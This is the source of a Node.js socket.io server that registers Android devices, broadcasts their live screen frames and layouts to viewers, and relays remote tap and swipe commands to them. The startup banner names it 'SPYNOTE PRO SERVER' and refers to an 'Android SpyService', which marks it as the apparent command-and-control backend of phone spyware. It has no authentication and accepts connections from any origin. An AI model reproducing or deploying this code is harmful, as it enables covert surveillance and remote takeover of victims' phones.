const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 3000,
    maxHttpBufferSize: 200e6
});

app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

// 🔥 ROUTES
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/devices', (req, res) => res.json(Array.from(devices.entries())));

const devices = new Map();
const GLOBAL_ROOM = 'all-screens';

let deviceCount = 0;

io.on('connection', (socket) => {
    console.log(`🔌 WebSocket Connected: ${socket.id.slice(0,8)}`);
    socket.join(GLOBAL_ROOM);
    
    // 🔥 DEVICE REGISTRATION
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId || `device_${++deviceCount}`;
        const deviceData = {
            ...deviceInfo,
            deviceId,
            connected: true,
            socketId: socket.id,
            lastSeen: Date.now(),
            status: 'layout-ready'
        };
        devices.set(deviceId, deviceData);
        socket.join(`device_${deviceId}`);
        
        console.log(`✅ ✅ DEVICE LIVE: ${deviceId} | ${deviceInfo.model || 'Android'} | ${deviceInfo.width}x${deviceInfo.height}`);
        io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
    });

    // 🔥 SCREEN + LAYOUT STREAMING
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = Date.now();
            devices.set(deviceId, device);
            
            // Broadcast to all viewers
            io.to(GLOBAL_ROOM).emit('screen-frame', {
                ...frameData,
                layout: frameData.layout || []
            });
        }
    });

    // 🔥 REMOTE CONTROL COMMANDS
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, dx, dy } = controlData;
        if (devices.has(deviceId)) {
            console.log(`🎮 CONTROL: ${action.toUpperCase()} on ${deviceId.slice(0,12)} (${x||0},${y||0})`);
            socket.to(`device_${deviceId}`).emit('control', controlData);
        }
    });

    socket.on('disconnect', () => {
        console.log(`🔌 DISCONNECTED: ${socket.id.slice(0,8)}`);
        for (let [deviceId, device] of devices.entries()) {
            if (device.socketId === socket.id) {
                devices.set(deviceId, { ...device, connected: false });
                io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
                console.log(`❌ DEVICE OFFLINE: ${deviceId}`);
                break;
            }
        }
    });
});

// 🔥 HEARTBEAT
setInterval(() => {
    const now = Date.now();
    for (let [deviceId, device] of devices.entries()) {
        if (device.connected && (now - device.lastSeen > 30000)) {
            devices.set(deviceId, { ...device, connected: false });
        }
    }
    io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
}, 5000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('\n🚀 SPYNOTE PRO SERVER LIVE!');
    console.log(`📱 Port: ${PORT}`);
    console.log(`🌐 URL: http://localhost:${PORT}`);
    console.log(`📱 Android SpyService connect karega!\n`);
});
